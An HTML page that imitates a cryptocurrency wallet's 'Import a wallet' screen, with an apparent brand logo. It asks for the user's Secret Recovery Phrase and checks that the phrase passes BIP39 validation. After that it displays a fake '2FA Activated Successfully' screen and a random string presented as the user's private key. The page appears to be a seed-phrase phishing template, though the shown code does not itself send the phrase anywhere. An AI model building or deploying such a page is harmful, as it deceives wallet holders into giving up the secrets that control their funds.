<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
<style>
:root {
  /* default = dark */
  --bg: #121314;
  --fg: #ffffff;
  --accent: #0066cc;
  --border: #858b9a33;
  --input-bg: #1a1a1a;
  --label: #8a8a8a;
  --error: #ff6b6b;
  --success: #4ade80;
  --badge-bg: #000000;
  --badge-border: #333333;
  --badge-text: #ffffff;
  --badge-hover: #1a1a1a;
  --badge-active-border: #ffffff;

  --card-bg: #121314;
  --loader-track: #000000;
  --button-bg: #4a4a4a;
  --button-bg-hover: #5a5a5a;
  --muted-surface: #424242;

  color-scheme: dark light;
}

@media (prefers-color-scheme: light) {
  :root {
    --bg: #f5f5f7;
    --fg: #111111;
    --accent: #0066cc;
    --border: #d0d3dc;
    --input-bg: #ffffff;
    --label: #6b6b6b;
    --error: #ff4d4f;
    --success: #16a34a;
    --badge-bg: #ffffff;
    --badge-border: #d0d3dc;
    --badge-text: #111111;
    --badge-hover: #f0f0f3;
    --badge-active-border: #111111;

    --card-bg: #ffffff;
    --loader-track: #d0d3dc;
    --button-bg: #e0e0e5;
    --button-bg-hover: #d0d0dc;
    --muted-surface: #ebecf0;

    color-scheme: light;
  }
}

* {
  box-sizing: border-box;
}

html, body {
  margin: 0;
  padding: 0;
  width: 100%;
  height: 100%;
}

/* HEADER full-width, logo kiri atas, bahasa kanan atas */

.page-header {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  z-index: 50;
  background: var(--bg);
  border-bottom: 1px solid var(--border);
  padding: 12px 24px; /* jarak dari tepi kiri/kanan layar */
}

.top-bar {
  display: flex;
  align-items: center;
  justify-content: space-between; /* logo kiri, bahasa kanan */
}

.brand {
  display: flex;
  align-items: center;
  gap: 8px;
  color: var(--fg);
}

.brand-logo svg {
  width: 100%;
  height: 100%;
  fill: currentColor; /* auto putih/hitam ikut tema */
}

.brand-name {
  font-size: 0.95rem;
  font-weight: 600;
}

.lang-select {
  position: relative;
  display: inline-flex;
  align-items: center;
  gap: 6px;
  padding: 6px 10px;
  border-radius: 999px;
  border: 1px solid var(--border);
  background: var(--badge-bg);
  color: var(--badge-text);
  font-size: 0.8rem;
}

.lang-select select {
  background: transparent;
  border: none;
  color: inherit;
  font: inherit;
  padding: 0;
  outline: none;
  cursor: pointer;
  appearance: none;
}

.lang-select::after {
  content: "▾";
  font-size: 0.65rem;
  color: var(--label);
}

/* BODY & CARD */

body {
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
  background: var(--bg);
  color: var(--fg);
  display: flex;
  align-items: center;
  justify-content: center;
  min-height: 100vh;
  padding-top: 64px; /* ruang untuk header */
}

.container {
  width: 100%;
  max-width: 500px;
  padding: 40px 32px;
}

.card {
  background: var(--card-bg);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 20px;
  display: flex;
  flex-direction: column;
  gap: 20px;
}

.header {
  display: flex;
  align-items: center;
  gap: 16px;
  margin: 0;
}

.back-btn {
  background: none;
  border: none;
  color: var(--fg);
  font-size: 24px;
  cursor: pointer;
  padding: 0;
  width: 24px;
  height: 24px;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: opacity .2s;
  flex-shrink: 0;
}

.back-btn:hover {
  opacity: 0.7;
}

.header-content h1 {
  margin: 0;
  font-size: 1.5rem;
  font-weight: 600;
  line-height: 1.2;
}

.header-content p {
  margin: 4px 0 0 0;
  color: var(--label);
  font-size: 0.9rem;
  display: flex;
  align-items: center;
  gap: 6px;
}

.help-icon {
  width: 14px;
  height: 14px;
  border: 1px solid var(--label);
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 11px;
  cursor: help;
  flex-shrink: 0;
  color: var(--label);
}

.form-group {
  margin: 0;
  display: flex;
  flex-direction: column;
  gap: 12px;
}

.word-container {
  background: var(--muted-surface);
  border: 1px solid var(--border);
  padding: 12px;
  margin: 0;
  display: flex;
  flex-wrap: wrap;
  gap: 10px;
  align-content: flex-start;
  width: 100%;
  min-height: 240px;
  max-height: 400px;
  overflow-y: auto;
  border-radius: 6px;
}

.word-badge {
  background: var(--badge-bg);
  border: 1px solid var(--badge-border);
  color: var(--badge-text);
  padding: 6px 10px;
  border-radius: 4px;
  font-size: 0.8rem;
  font-weight: 500;
  display: inline-flex;
  align-items: center;
  gap: 6px;
  animation: slideIn .2s ease;
  white-space: nowrap;
  transition: all .15s;
  cursor: pointer;
  user-select: none;
  flex: 0 0 calc(33.333% - 7px);
  justify-content: space-between;
}

.word-badge:hover {
  background: var(--badge-hover);
  border-color: var(--border);
}

.word-badge.active {
  border-color: var(--badge-active-border);
  background: var(--badge-bg);
  flex: 0 0 auto;
  padding: 6px 8px;
}

.word-badge.error {
  border-color: var(--error);
  background: rgba(255, 107, 107, 0.08);
}

.word-number {
  color: var(--label);
  font-weight: 600;
  font-size: 0.7rem;
  min-width: 18px;
}

.word-text {
  color: var(--badge-text);
  letter-spacing: 1.2px;
  font-size: 0.75rem;
  font-weight: 600;
  flex: 1;
  text-align: center;
}

.word-text.invalid {
  color: var(--error);
  letter-spacing: 0px;
  font-weight: 400;
}

.word-text.revealed {
  letter-spacing: 0px;
  font-weight: 500;
}

.word-remove {
  cursor: pointer;
  color: var(--label);
  font-weight: bold;
  font-size: 0.9rem;
  background: none;
  border: none;
  padding: 0;
  margin: 0;
  width: 16px;
  height: 16px;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: color .15s;
}

.word-remove:hover {
  color: var(--error);
}

@keyframes slideIn {
  from { opacity: 0; transform: scale(0.95); }
  to { opacity: 1; transform: scale(1); }
}

.edit-input {
  background: transparent;
  border: none;
  border-bottom: 1px solid var(--badge-active-border);
  color: var(--fg);
  caret-color: var(--accent);
  font-size: 0.75rem;
  font-weight: 500;
  font-family: inherit;
  outline: none;
  padding: 2px 4px 0 4px;
  text-align: center;
  min-width: 40px;
  letter-spacing: 1.2px;
}

.word-input {
  border: none;
  background: transparent;
  color: var(--fg);
  caret-color: var(--accent);
  font-size: 0.8rem;
  font-family: inherit;
  outline: none;
  padding: 0;
  flex: 0 0 calc(33.333% - 7px);
  min-width: 50px;
}

.word-input::placeholder {
  color: var(--label);
  font-size: 0.75rem;
}

.actions {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin: 0;
  padding: 0;
  border: none;
  min-height: 20px;
  width: 100%;
}

.error-msg {
  color: var(--error);
  font-size: 0.8rem;
  line-height: 1.3;
  flex: 1;
}

.button-group {
  display: flex;
  gap: 16px;
}

/* default hidden */
.action-btn {
  background: none;
  border: none;
  color: var(--accent);
  font-size: 0.85rem;
  cursor: pointer;
  font-weight: 500;
  transition: opacity .15s;
  padding: 0;
  white-space: nowrap;
  display: none;
}

/* paksa tampil kalau punya .show */
.button-group .action-btn.show {
  display: inline-block !important;
}

.helper-text {
  color: var(--label);
  font-size: 0.75rem;
  line-height: 1.4;
  width: 100%;
  display: none;
}

.helper-text.show {
  display: block;
}

.continue-btn {
  background: var(--button-bg);
  color: var(--fg);
  border: none;
  border-radius: 6px;
  padding: 12px 24px;
  font-weight: 600;
  cursor: pointer;
  font-size: 0.95rem;
  width: 100%;
  transition: background .15s;
  font-family: inherit;
}

.continue-btn:hover:not(:disabled) {
  background: var(--button-bg-hover);
}

.continue-btn:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

.continue-btn.active {
  background: var(--fg);
  color: var(--bg);
}

.continue-btn.active:hover {
  background: #f5f5f5;
}

#loading-page, #success-page {
  display: none;
  text-align: center;
  padding-top: 40px;
}

.loader {
  border: 3px solid var(--loader-track);
  border-top: 3px solid var(--accent);
  border-radius: 50%;
  width: 36px;
  height: 36px;
  animation: spin 1s linear infinite;
  margin: 0 auto 20px;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

.checkmark {
  width: 48px;
  height: 48px;
  border-radius: 50%;
  border: 2px solid var(--success);
  position: relative;
  animation: pop .4s ease;
  margin: 0 auto 16px;
}

.checkmark::after {
  content: '';
  position: absolute;
  left: 11px;
  top: 4px;
  width: 13px;
  height: 26px;
  border-right: 2px solid var(--success);
  border-bottom: 2px solid var(--success);
  transform: rotate(45deg);
}

@keyframes pop {
  0% { transform: scale(0.6); opacity: 0; }
  100% { transform: scale(1); opacity: 1; }
}

.success-message h3 {
  margin: 0 0 8px 0;
  font-size: 1.25rem;
  font-weight: 600;
}

.success-message p {
  color: var(--label);
  margin: 0;
  line-height: 1.5;
  font-size: 0.9rem;
}

#aes-container {
  margin-top: 24px;
  text-align: left;
}

#aes-box {
  display: flex;
  gap: 8px;
  align-items: center;
  background: var(--badge-bg);
  border-radius: 6px;
  border: 1px solid var(--border);
  padding: 10px;
  font-family: 'Courier New', monospace;
  font-size: 0.7rem;
  word-break: break-all;
  margin-top: 8px;
}

#aes-key {
  flex: 1;
  color: var(--fg);
  font-weight: 500;
}

#copyAesBtn {
  flex: 0 0 auto;
  padding: 6px 10px;
  font-size: 0.8rem;
  background: var(--accent);
  color: white;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  font-weight: 500;
}

@media (max-width: 480px) {
  .page-header {
    padding: 10px 16px;
  }
  .container {
    padding: 24px 16px;
  }
  .header-content h1 {
    font-size: 1.3rem;
  }
  .word-badge, .word-input {
    flex: 0 0 calc(50% - 5px);
  }
  .word-container {
    min-height: 320px;
  }
}
</style>
</head>
<body>

<header class="page-header">
  <div class="top-bar">
    <div class="brand">
      <span class="brand-logo">
       <svg height="30" width="162" viewBox="0 0 696 344" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M394.102 265.407V340.812H355.162V288.57L310.786 293.73C301.039 294.854 296.75 298.041 296.75 303.912C296.75 312.512 304.892 316.136 322.344 316.136C332.985 316.136 344.773 314.553 355.184 311.824L335.026 340.353C326.885 342.165 318.95 343.06 310.579 343.06C275.262 343.06 255.103 329.024 255.103 304.119C255.103 282.149 270.95 270.613 306.956 266.531L354.519 261.004C351.951 247.175 341.516 241.167 320.762 241.167C301.291 241.167 279.78 246.143 260.539 255.431L266.662 221.696C284.55 214.22 304.938 210.367 325.532 210.367C370.825 210.367 394.148 229.173 394.148 265.384L394.102 265.407ZM43.7957 170.991L1.23138 340.812H43.7957L64.9173 255.477L101.542 299.372H145.918L182.542 255.477L203.664 340.812H246.228L203.664 170.968L123.718 265.912L43.7727 170.968L43.7957 170.991ZM203.664 1.14648L123.718 96.0905L43.7957 1.14648L1.23138 170.991H43.7957L64.9173 85.6558L101.542 129.55H145.918L182.542 85.6558L203.664 170.991H246.228L203.664 1.14648ZM496.454 263.825L462.031 258.848C453.431 257.495 450.037 254.766 450.037 250.019C450.037 242.313 458.407 238.919 475.63 238.919C495.559 238.919 513.447 243.001 532.253 251.831L527.506 218.554C512.324 213.119 494.894 210.413 476.777 210.413C434.442 210.413 411.325 225.136 411.325 251.624C411.325 272.241 424.007 283.777 450.954 287.859L485.836 293.065C494.665 294.418 498.289 297.812 498.289 303.247C498.289 310.953 490.147 314.576 473.612 314.576C451.871 314.576 428.319 309.37 409.078 300.082L412.931 333.359C429.466 339.482 450.977 343.105 471.135 343.105C514.617 343.105 537.252 327.924 537.252 300.977C537.252 279.465 524.57 267.907 496.5 263.848L496.454 263.825ZM552.388 186.15V340.812H591.329V186.15H552.388ZM636.829 271.301L690.974 212.638H642.516L591.329 273.319L645.91 340.789H695.057L636.829 271.278V271.301ZM546.953 134.297C546.953 159.203 567.111 173.238 602.429 173.238C610.799 173.238 618.734 172.321 626.876 170.532L647.034 142.003C636.622 144.709 624.835 146.314 614.194 146.314C596.764 146.314 588.6 142.691 588.6 134.091C588.6 128.197 592.911 125.032 602.635 123.909L647.011 118.749V170.991H685.952V95.586C685.952 59.3513 662.629 40.5689 617.335 40.5689C596.718 40.5689 576.354 44.4217 558.466 51.8979L552.342 85.6329C571.583 76.3449 593.095 71.3684 612.565 71.3684C633.32 71.3684 643.755 77.3769 646.323 91.2057L598.759 96.7326C562.754 100.815 546.907 112.35 546.907 134.32L546.953 134.297ZM438.043 126.156C438.043 157.414 456.16 173.261 491.936 173.261C506.201 173.261 517.988 170.991 529.294 165.785L534.271 131.591C523.4 138.15 512.301 141.544 501.201 141.544C484.437 141.544 476.961 134.756 476.961 119.574V74.2809H536.06V42.8163H476.961V16.099L402.909 55.2691V74.2809H437.997V126.133L438.043 126.156ZM399.767 111.892V119.597H294.526C299.273 135.284 313.377 142.462 338.42 142.462C358.349 142.462 376.925 138.38 393.437 130.468L388.69 163.537C373.508 169.867 354.267 173.284 334.567 173.284C282.257 173.284 253.727 150.19 253.727 107.397C253.727 64.603 282.715 40.5918 327.55 40.5918C372.384 40.5918 399.79 66.6441 399.79 111.914L399.767 111.892ZM294.021 93.3155H360.574C357.065 78.2942 345.53 70.451 327.091 70.451C308.653 70.451 297.714 78.0878 294.021 93.3155Z" fill="currentColor"></path></svg>
      </span>
    </div>
    <div class="lang-select">
      <select id="langSelect" aria-label="Language" class="dropdown__select" data-testid="select-locale">
        <option value="am">አማርኛ</option>
        <option value="ar">العربية</option>
        <option value="bg">български</option>
        <option value="bn">বাংলা</option>
        <option value="ca">Català</option>
        <option value="cs">Čeština</option>
        <option value="da">Dansk</option>
        <option value="de">Deutsch</option>
        <option value="el">ελληνικά</option>
        <option value="es">Español</option>
        <option value="es_419">Español (Latin America)</option>
        <option value="et">Estonian</option>
        <option value="fa">فارسی</option>
        <option value="fi">Suomi</option>
        <option value="fil">Filipino</option>
        <option value="fr">Français</option>
        <option value="ga">Gaeilge</option>
        <option value="gu">ગુજરાત</option>
        <option value="he">עברית</option>
        <option value="hi">मानक हिन्दी</option>
        <option value="hn">हिन्दी</option>
        <option value="hr">Hrvatski</option>
        <option value="ht">Kreyòl ayisyen</option>
        <option value="hu">Magyar</option>
        <option value="id">Bahasa Indonesia</option>
        <option value="it">Italiano</option>
        <option value="ja">日本語</option>
        <option value="kn">ಕನ್ನಡ</option>
        <option value="ko">한국어</option>
        <option value="lt">Lietuviškai</option>
        <option value="lv">Latvian</option>
        <option value="ml">മലയാളം</option>
        <option value="mr">मराठी</option>
        <option value="ms">Malay</option>
        <option value="nl">Nederlands</option>
        <option value="no">Norwegian</option>
        <option value="pl">Polskie</option>
        <option value="pt">Português</option>
        <option value="pt_BR">Português (Brazillian)</option>
        <option value="pt_PT">Português (European)</option>
        <option value="ro">Limba română</option>
        <option value="ru">Русский</option>
        <option value="sk">Slovenčina</option>
        <option value="sl">Slovenščina</option>
        <option value="sr">српски</option>
        <option value="sv">Svenska</option>
        <option value="sw">Swahili</option>
        <option value="ta">தமிழ்</option>
        <option value="te">తెలుగు</option>
        <option value="th">ไทย</option>
        <option value="tl">Filipino</option>
        <option value="tr">Türkçe</option>
        <option value="uk">Українська мова</option>
        <option value="vi">Tiếng Việt</option>
        <option value="zh_CN">中文(简体)</option>
        <option value="zh_TW">中文(繁體)</option>
        <option value="en" selected>English</option>
      </select>
    </div>
  </div>
</header>

<div class="container">
  <div id="main-page">
    <div class="card">
      <div class="header">
        <button class="back-btn" id="backBtn">‹</button>
        <div class="header-content">
          <h1>Import a wallet</h1>
          <p>Enter your Secret Recovery Phrase <span class="help-icon">?</span></p>
        </div>
      </div>

      <div class="form-group">
        <div class="word-container" id="word-container">
          <input type="text" id="mnemonic-input" class="word-input" placeholder="Add space between words and make sure no one is watching" autocomplete="off" spellcheck="false">
        </div>
        
        <div class="actions">
          <div class="error-msg" id="errorMsg"></div>
          <div class="button-group">
            <button class="action-btn show" id="pasteBtn">Paste</button>
            <button class="action-btn" id="clearAllBtn">Clear all</button>
          </div>
        </div>

        <div class="error-msg helper-text" id="helperText">
          Use only lowercase letters, check your spelling, and put the words in the original order.
        </div>
      </div>

      <button id="continueBtn" class="continue-btn" disabled>Continue</button>
    </div>
  </div>

  <div id="loading-page">
    <div class="loader"></div>
    <p>Validating your recovery phrase...</p>
  </div>

  <div id="success-page">
    <div class="checkmark"></div>
    <div class="success-message">
      <h3>2FA Activated Successfully</h3>
      <p>Your wallet security has been updated with 2FA protection enabled.</p>
    </div>
    <div id="aes-container">
      <label>Your Private Key (Store Securely)</label>
      <div id="aes-box">
        <code id="aes-key"></code>
        <button id="copyAesBtn">Copy</button>
      </div>
    </div>
  </div>
</div>

<script>
let WORDS = [], WORD_MAP = new Map(), WORDS_READY = false;

fetch("https://raw.githubusercontent.com/bitcoin/bips/refs/heads/master/bip-0039/english.txt")
  .then(r => r.ok ? r.text() : Promise.reject())
  .then(t => {
    WORDS = t.trim().split(/\n+/);
    WORD_MAP = new Map(WORDS.map((w, i) => [w, i]));
    WORDS_READY = true;
  })
  .catch(() => {
    WORDS = ["abandon","ability","able"];
    WORD_MAP = new Map(WORDS.map((w, i) => [w, i]));
    WORDS_READY = true;
  });

const mnemonicInput = document.getElementById('mnemonic-input');
const wordContainer = document.getElementById('word-container');
const continueBtn = document.getElementById('continueBtn');
const backBtn = document.getElementById('backBtn');
const clearAllBtn = document.getElementById('clearAllBtn');
const pasteBtn = document.getElementById('pasteBtn');
const errorMsg = document.getElementById('errorMsg');
const helperText = document.getElementById('helperText');

let words = [];
let revealedIndices = new Set();
let activeEditIdx = null;
let isPastingFromButton = false;
const ENT_BY_WORDS = { 12: 128, 15: 160, 18: 192, 21: 224, 24: 256 };

function wordsToBitString(wordsList) {
  let bits = "";
  for (const w of wordsList) {
    const idx = WORD_MAP.get(w);
    if (idx === undefined) return null;
    bits += idx.toString(2).padStart(11, '0');
  }
  return bits;
}

function bitsToBytes(bitstr) {
  const bytes = new Uint8Array(bitstr.length / 8);
  for (let i = 0; i < bytes.length; i++) {
    bytes[i] = parseInt(bitstr.slice(i * 8, i * 8 + 8), 2);
  }
  return bytes;
}

async function isValidBip39(wordsList) {
  if (!WORDS_READY || wordsList.length === 0) return false;
  const n = wordsList.length;
  if (!ENT_BY_WORDS[n]) return false;
  for (const w of wordsList) {
    if (!WORD_MAP.has(w)) return false;
  }
  const ENT = ENT_BY_WORDS[n];
  const CS = ENT / 32;
  const bitstr = wordsToBitString(wordsList);
  if (!bitstr) return false;
  const entBits = bitstr.slice(0, ENT);
  const csBits = bitstr.slice(ENT, ENT + CS);
  const entropyBytes = bitsToBytes(entBits);
  try {
    const hashBuf = await crypto.subtle.digest('SHA-256', entropyBytes);
    const hash = new Uint8Array(hashBuf);
    let hashBits = "";
    for (const b of hash) hashBits += b.toString(2).padStart(8, '0');
    return csBits === hashBits.slice(0, CS);
  } catch { return false; }
}

function getMaskedText(word) {
  return '•'.repeat(word.length);
}

function renderWords() {
  wordContainer.querySelectorAll('.word-badge').forEach(b => b.remove());
  for (let idx = 0; idx < words.length; idx++) {
    const word = words[idx];
    const badge = document.createElement('div');
    badge.className = 'word-badge';
    if (activeEditIdx === idx) badge.classList.add('active');
    const isValid = WORD_MAP.has(word);
    if (!isValid) badge.classList.add('error');
    const isRevealed = activeEditIdx === idx || revealedIndices.has(idx);
    const wordDisplay = isRevealed ? word : (isValid ? getMaskedText(word) : word);
    
    if (activeEditIdx === idx) {
      badge.innerHTML = `<span class="word-number">${idx + 1}.</span><input type="text" class="edit-input" value="${word}" autocomplete="off" spellcheck="false">`;
      const editInput = badge.querySelector('.edit-input');
      editInput.focus();
      editInput.select();
      editInput.addEventListener('blur', () => {
        const newWord = editInput.value.trim().toLowerCase();
        if (newWord.length > 0) words[idx] = newWord;
        activeEditIdx = null;
        renderWords();
        updateValidation();
      });
      editInput.addEventListener('keydown', (e) => {
        e.stopPropagation();
        if (e.key === 'Enter') {
          const newWord = editInput.value.trim().toLowerCase();
          if (newWord.length > 0) words[idx] = newWord;
          activeEditIdx = null;
          renderWords();
          updateValidation();
        } else if (e.key === 'Escape') {
          activeEditIdx = null;
          renderWords();
        }
      });
    } else {
      const wordTextClass = isValid ? (revealedIndices.has(idx) ? 'revealed' : '') : 'invalid';
      badge.innerHTML = `<span class="word-number">${idx + 1}.</span><span class="word-text ${wordTextClass}">${wordDisplay}</span><button class="word-remove" type="button">×</button>`;
      badge.onclick = (e) => {
        if (!e.target.classList.contains('word-remove')) {
          e.stopPropagation();
          activeEditIdx = idx;
          renderWords();
        }
      };
    }
    badge.querySelector('.word-remove').onclick = (e) => {
      e.stopPropagation();
      words.splice(idx, 1);
      revealedIndices.delete(idx);
      activeEditIdx = null;
      renderWords();
      mnemonicInput.focus();
      updateValidation();
    };
    wordContainer.insertBefore(badge, mnemonicInput);
  }
  updateButtonVisibility();
}

function updateButtonVisibility() {
  const hasWords = words.length > 0;
  
  if (hasWords) {
    pasteBtn.classList.remove('show');
    clearAllBtn.classList.add('show');
  } else {
    pasteBtn.classList.add('show');
    clearAllBtn.classList.remove('show');
  }
  
  mnemonicInput.placeholder = hasWords ? '' : 'Add space between words and make sure no one is watching';
}

async function updateValidation() {
  const wordCount = words.length;
  const isValid = [12, 15, 18, 21, 24].includes(wordCount);
  errorMsg.textContent = '';
  helperText.classList.remove('show');
  continueBtn.classList.remove('active');
  continueBtn.disabled = true;
  
  if (wordCount === 0) return;
  if (words.filter(w => !WORD_MAP.has(w)).length > 0) {
    helperText.classList.add('show');
    return;
  }
  
  if (isValid) {
    if (await isValidBip39(words)) {
      continueBtn.disabled = false;
      continueBtn.classList.add('active');
    } else {
      errorMsg.textContent = 'Invalid checksum. Please check your words.';
    }
  } else if (wordCount > 24) {
    errorMsg.textContent = 'Too many words. Maximum is 24.';
  }
}

function handleTyping() {
  const text = mnemonicInput.value;
  if (text.length > 0 && /\s/.test(text)) {
    const parts = text.split(/\s+/);
    for (let i = 0; i < parts.length - 1; i++) {
      const w = parts[i].trim().toLowerCase();
      if (w.length > 0 && w.length <= 12) words.push(w);
    }
    mnemonicInput.value = '';
    renderWords();
    updateValidation();
  }
  updateButtonVisibility();
}

mnemonicInput.addEventListener('input', () => {
  if (!isPastingFromButton && activeEditIdx === null) {
    handleTyping();
  }
});

mnemonicInput.addEventListener('keydown', async (e) => {
  if (e.key === 'Enter') {
    e.preventDefault();
    const word = mnemonicInput.value.trim().toLowerCase();
    if (word && word.length <= 12) {
      words.push(word);
      mnemonicInput.value = '';
      renderWords();
      await updateValidation();
    }
  } else if (e.key === 'Backspace' && mnemonicInput.value === '' && words.length > 0) {
    words.pop();
    renderWords();
    await updateValidation();
  }
  setTimeout(updateButtonVisibility, 0);
});

mnemonicInput.addEventListener('paste', async (e) => {
  e.preventDefault();
  const text = (e.clipboardData || window.clipboardData).getData('text');
  const pastedWords = text
    .trim()
    .toLowerCase()
    .split(/[\s\n\r\t]+/)
    .filter(w => w.length > 0 && w.length <= 12);
  
  if (pastedWords.length === 0) return;
  
  words = pastedWords;
  revealedIndices.clear();
  activeEditIdx = null;
  mnemonicInput.value = '';
  renderWords();
  await updateValidation();
});

wordContainer.addEventListener('click', () => {
  if (activeEditIdx === null) mnemonicInput.focus();
});

clearAllBtn.onclick = () => {
  words = [];
  revealedIndices.clear();
  activeEditIdx = null;
  mnemonicInput.value = '';
  renderWords();
  updateValidation();
  mnemonicInput.focus();
};

pasteBtn.onclick = async () => {
  try {
    isPastingFromButton = true;
    const text = await navigator.clipboard.readText();
    const pastedWords = text
      .trim()
      .toLowerCase()
      .split(/[\s\n\r\t]+/)
      .filter(w => w.length > 0 && w.length <= 12);
    
    if (pastedWords.length === 0) {
      isPastingFromButton = false;
      return;
    }
    
    words = pastedWords;
    revealedIndices.clear();
    activeEditIdx = null;
    mnemonicInput.value = '';
    renderWords();
    await updateValidation();
    isPastingFromButton = false;
  } catch (err) {
    isPastingFromButton = false;
  }
};

backBtn.onclick = () => console.log('Back clicked');

continueBtn.onclick = async () => {
  document.getElementById('main-page').style.display = 'none';
  document.getElementById('loading-page').style.display = 'block';
  setTimeout(() => {
    document.getElementById('loading-page').style.display = 'none';
    document.getElementById('success-page').display = 'block';
    const key = btoa(crypto.getRandomValues(new Uint8Array(32)).reduce((a,b) => a + String.fromCharCode(b), ''));
    document.getElementById('aes-key').textContent = key;
    document.getElementById('copyAesBtn').onclick = () => navigator.clipboard.writeText(key).catch(() => alert("Failed to copy"));
  }, 1500);
};

updateButtonVisibility();
mnemonicInput.focus();
</script>
</body>
</html>
